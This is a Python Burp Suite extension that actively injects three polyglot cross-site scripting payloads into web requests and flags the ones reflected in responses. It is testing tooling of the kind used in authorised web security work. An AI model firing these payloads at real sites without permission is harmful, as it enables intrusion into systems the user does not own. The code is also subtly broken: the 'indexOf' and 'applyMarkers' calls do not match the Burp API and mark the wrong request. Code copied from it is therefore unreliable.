from burp import IBurpExtender, IScannerCheck, IScanIssue
from java.util import ArrayList

class BurpExtender(IBurpExtender, IScannerCheck):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("Polyglot XSS Scanner")
        callbacks.registerScannerCheck(self)
        
    def doPassiveScan(self, baseRequestResponse):
        return None

    def doActiveScan(self, baseRequestResponse, insertionPoint):
        polyglot_xss_payloads = [
            '<svG/onloAd=prompt`1`>',
            '"-alert(1)-"',
            'javascript:/*-/*`/*`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A',
        ]
        issues = ArrayList()

        for payload in polyglot_xss_payloads:
            attack = self._helpers.buildHttpRequest(insertionPoint.buildRequest(payload))
            response = self._callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), attack)

            if payload.lower() in self._helpers.bytesToString(response.getResponse()).lower():
                issues.add(CustomScanIssue(
                    baseRequestResponse.getHttpService(),
                    self._helpers.analyzeRequest(baseRequestResponse).getUrl(),
                    [self._callbacks.applyMarkers(baseRequestResponse, None, [self._helpers.indexOf(response.getResponse(), payload)])],
                    "Polyglot XSS",
                    "A polyglot XSS payload was reflected in the response.",
                    "High",
                    "Firm"
                ))
                break

        return issues

class CustomScanIssue(IScanIssue):
    def __init__(self, httpService, url, requestResponseArray, name, detail, severity, confidence):
        self._httpService = httpService
        self._url = url
        self._requestResponseArray = requestResponseArray
        self._name = name
        self._detail = detail
        self._severity = severity
        self._confidence = confidence

    def getUrl(self):
        return self._url

    def getHttpMessages(self):
        return self._requestResponseArray

    def getHttpService(self):
        return self._httpService

    def getIssueName(self):
        return self._name

    def getIssueType(self):
        return 0

    def getSeverity(self):
        return self._severity

    def getConfidence(self):
        return self._confidence

    def getIssueBackground(self):
        return None

    def getRemediationBackground(self):
        return None

    def getIssueDetail(self):
        return self._detail

    def getRemediationDetail(self):
        return None
